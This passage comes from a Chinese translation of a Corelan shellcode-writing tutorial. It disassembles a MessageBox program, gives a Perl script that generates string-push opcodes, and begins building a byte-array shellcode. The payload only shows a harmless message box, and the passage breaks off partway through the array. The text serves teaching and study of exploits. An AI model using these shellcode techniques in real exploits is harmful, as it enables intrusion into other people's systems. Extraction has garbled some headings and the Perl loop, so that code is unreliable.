MessageBox(NULL,
"YouhavebeenpwnedbyCorelan",
"Corelan",
MB_OK);
}
编译运行这个程序：
注意：正如你看到的，我用Icc-win32。User32.dll动态链接库似乎已经动态加载了。如果你用其他的编
译器，你可能加上LoadLibrary("user32.dll");调用它来加载这个dll。
用反汇编工具（IDAFree）打开这个可执行文件。在分析完成之后，你将会得到如下的代码：
.text:004012D4;¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦SUBROUTINE¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004012D4
.text:004012D4;Attributes:bp-basedframe
.text:004012D4
.text:004012D4 public_main
.text:004012D4_main procnear ;CODEXREF:_mainCRTStartup+92p
.text:004012D4 push ebp
.text:004012D5 mov ebp,esp
.text:004012D7 push 0 ;uType
.text:004012D9 push offsetCaption ;"Corelan"
.text:004012DE push offsetText ;"YouhavebeenpwnedbyCorelan"
.text:004012E3 push 0 ;hWnd
.text:004012E5 call _MessageBoxA@16;MessageBoxA(x,x,x,x)
.text:004012EA mov eax,0
.text:004012EF leave
.text:004012F0 retn
.text:004012F0_main endp
.text:004012F0
.text:004012F0;---------------------------------------------------------------------------
或者，你也可以把它加载到调试器中：
004012D4 /$55 PUSHEBP
004012D5 |.89E5 MOVEBP,ESP
004012D7 |.6A00 PUSH0 ;/Style=MB_OK|MB_APPLMODAL
004012D9 |.68A0404000 PUSHcorelan1.004040A0 ;|Title="Corelan"
004012DE |. 68A8404000 PUSH corelan1.004040A8 ; |Text = "You have been pwned by
Corelan"
004012E3 |.6A00 PUSH0 ;|hOwner=NULL
004012E5 |.E83A020000 CALL ;\MessageBoxA
004012EA |.B800000000 MOVEAX,0 004012EF |.C9 LEAVE
004012F0 \.C3 RETN
好的，我们看到了什么？
1、pushebp和movebp，esp指令是用来设置堆栈的一部分指令。我们在自己的shellcode
里不需要他们，因为我们会在一个已经运行的程序里运行我们的shellcode，我们假设堆栈已
经被正确的设置好了。（这可能是不对的，在实际生活中，你需要调节寄存器/堆栈来使你的
shellcode工作，但这个暂时超出讨论的范围）。
2、我们把会用到的参数放到栈顶，按反序入栈。标题（0x004040A0）和MessageBox的文
本（0x004040A8）是从可执行文件的.data节中取出的。
按钮的样式（MB_OK）和句柄hOwner都是0。
3、我们调用MessageBoxA这个windowsAPI（包含在user32.dll中），这个API有四个参数。
假使你用lcc-win32并且不知道为什么MessageBox能工作：通过查看IDA中的导入表你可
以看到这个函数是从user32.dll导出的。这一点很重要。我们将会在后面讨论这个。
（或者，查看MSDN--你可以在函数结构页面的底部找到相应的Microsoft链接库）
4、扫尾并且推出程序。我们将在后面讨论这个。
实际上，我们离把这个转化成可用的shellcode不远。如果我们从上面的输出得到机器码字
节，我们有了自己的基本shellcode。我们只需要改变几处地方就能使它工作：
改变字符串（“Corelan”作为标题，“YouhavebeenpwnedbyCorelan”作为文本）放在
栈中的方式。在我们的例子里，这些字符串是从C程序的.data节中取出来的。但是当我们
exploit另一个程序时，我们不能用特定程序的.data节（因为它会包含一些其他的东西）。因
此我们需要自己把字符串放到栈中，然后把指向字符串的指针传递给MessageBoxA函数。
找到MessageBoxA的地址然后直接调用。用IDAFree打开user32.dll查看函数。在我的XP
SP3上，这个函数的地址在0x7E4507EA。这个地址将会和其他版本的操作系统上的地址不
一样，甚至是其他的补丁包，我们会在文章的后面处理这个问题。
因此一个0x7E4507EA的调用会导致MessageBoxA的执行，假设user32.dll已经被当前的进
程加载。我们现在先假设它已经被加载了--我们将在后面讨论动态加载。
把 aaaassssmmmm 转化为 sssshhhheeeellllllllccccooooddddeeee：将字符串入栈并且返回指向字符串的指针
1、把字符串转化为十六进制值
2、把十六进制值入栈（按反序）。不要忘了字符串末尾的null字节，确保一切都是4字节
对齐（需要时加上一些空格）
接下来的小脚本将会产生把字符串入栈的机器码（pvePushString.pl)：
#!/usr/bin/perl
#PerlscriptwrittenbyPeterVanEeckhoutte
#http://www.corelan.be:8800
#Thisscripttakesastringasargument
#andwillproducetheopcodes
#topushthisstringontothestack
# if($#ARGVne0){
print" usage:$0".chr(34)."Stringtoputonstack".chr(34)."\n";
exit(0); }
#convertstringtobytes
my$strToPush=$ARGV[0];
my$strThisChar="";
my$strThisHex="";
my$cnt=0;
my$bytecnt=0;
my$strHex="";
my$strOpcodes="";
my$strPush="";
print"Stringlength:".length($strToPush)."\n";
print"Opcodestopushthisstringontothestack:\n\n";
while($cnt0)
{
while(length($strHex)perlpvePushString.pl
usage:pvePushString.pl"Stringtoputonstack"
C:\shellcode>perlpvePushString.pl"Corelan"
Stringlength:7
Opcodestopushthisstringontothestack:
"\x68\x6c\x61\x6e\x00" //PUSH0x006e616c
"\x68\x43\x6f\x72\x65" //PUSH0x65726f43
C:\shellcode>perlpvePushString.pl"YouhavebeenpwnedbyCorelan"
Stringlength:30
Opcodestopushthisstringontothestack:
"\x68\x61\x6e\x20\x00" //PUSH0x00206e61
"\x68\x6f\x72\x65\x6c" //PUSH0x6c65726f
"\x68\x62\x79\x20\x43" //PUSH0x43207962
"\x68\x6e\x65\x64\x20" //PUSH0x2064656e
"\x68\x6e\x20\x70\x77" //PUSH0x7770206e
"\x68\x20\x62\x65\x65" //PUSH0x65656220
"\x68\x68\x61\x76\x65" //PUSH0x65766168
"\x68\x59\x6f\x75\x20" //PUSH0x20756f59
只把文本入栈是不够的。MessageBoxA函数（就像其他的windowsAPI函数）希望得到指
向文本的指针，而不是文本自身。因此我们必须把这个考虑进去。其他的两个参数（hWnd
和ButtonType）不要是指针，只要设为0就行了。因此我们需要对这两个参数用不同的方法。
intMessageBox(
HWNDhWnd,
LPCTSTRlpText,
LPCTSTRlpCaption,
UINTuType
);
=>hWnd和uType的值从堆栈中取出，lpText和lpCaption是指向字符串的指针。
从 aaaassssmmmm 到 sssshhhheeeellllllllccccooooddddeeee：把 MMMMeeeessssssssaaaaggggeeeeBBBBooooxxxx 的参数入栈
这就是我们要做的：
将字符串入栈然后把指向文本字符串的指针保存在寄存器中。因此在把字符串入栈后，必
须把当前的堆栈位置保存在一个寄存器中。我们将用ebx来存指向标题文本的指针，ecx
来保存messagebox的文本字符串的指针。当前栈顶位置=ESP。所以一个简单的mov
ebx,esp或者movecx,esp就行了。
将其中的一个寄存器置为0，所以我们在需要时将它入栈（用作hWnd和Button的参数）。
把一个寄存器置为0可以简单的采取对自身XOR（xoreax,eax）。
把0和指针按正确的顺序，正确的位置入栈（指向字符串的指针）
调用MessageBox函数（将会从堆栈的前四个地址并且把寄存器的内容作为MessageBox
函数的参数）
除了这个之外，当我们在user32.dll中看MessageBox函数时，我们可以看到：
明显参数是从一个位置指向EBP的偏移处（从EBP+8到EBP+14）。然后EBP是从堆栈中
弹出的ESP的值0x7E4507ED。因此意味着我们必须确认我们的四个参数被精确定位。这意
味着，基于我们将字符串入栈的方式，我们要在跳转到MessageBox这个函数之前再将4个
字节入栈。（只要在调试器里调试一下，你就会知道要做什么）。
从 aaaassssmmmm 到 sssshhhheeeellllllllccccooooddddeeee：将东西组装在一起
好的，我们开始吧：
charcode[]=
//firstputourstringsonthestack
"\x68\x6c\x61\x6e\x00" //Push"Corelan"
"\x68\x43\x6f\x72\x65" // =Caption
"\x8b\xdc" //movebx,esp=
// thisputsapointertothecaptionintoebx
"\x68\x61\x6e\x20\x00" //Push
"\x68\x6f\x72\x65\x6c" //"YouhavebeenpwnedbyCorelan"
"\x68\x62\x79\x20\x43" //=Text
"\x68\x6e\x65\x64\x20" //
"\x68\x6e\x20\x70\x77" //
"\x68\x20\x62\x65\x65" //
"\x68\x68\x61\x76\x65" //